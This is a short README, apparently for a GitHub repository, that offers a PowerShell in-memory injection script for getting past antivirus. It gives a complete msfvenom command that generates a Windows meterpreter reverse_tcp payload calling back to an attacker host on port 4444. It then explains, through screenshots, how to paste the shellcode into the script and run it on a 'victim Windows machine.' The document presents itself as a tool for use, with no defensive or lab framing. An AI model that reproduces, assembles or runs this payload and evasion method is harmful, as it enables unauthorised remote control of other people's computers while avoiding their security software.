# AntiVirus-bypass-PowerShell-In-Memory-Injection
Script made for bypassing antivirus using Powershell Injection method. Place your shellcode from msfvenom on line 15


<h3>Example of the payload needed:</h3>

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IPkali LPORT=4444 -f powershell
```

<h3>Then we copy the payload like this:</h3>

![Captura de pantalla 2023-02-27 210003.jpg](https://raw.githubusercontent.com/sergiovks/AntiVirus-Bypass-PowerShell-In-Memory-Injection/main/Captura%20de%20pantalla%202023-02-27%20210003.jpg)

<h3>And paste the payload to the 15th line of the .ps1 file:</h3>

![Captura de pantalla 2023-02-27 210359.jpg](https://raw.githubusercontent.com/sergiovks/AntiVirus-Bypass-PowerShell-In-Memory-Injection/main/Captura%20de%20pantalla%202023-02-27%20210359.jpg)

<h3>Save the final PowerShell script and run it within the victim Windows machine.</h3>
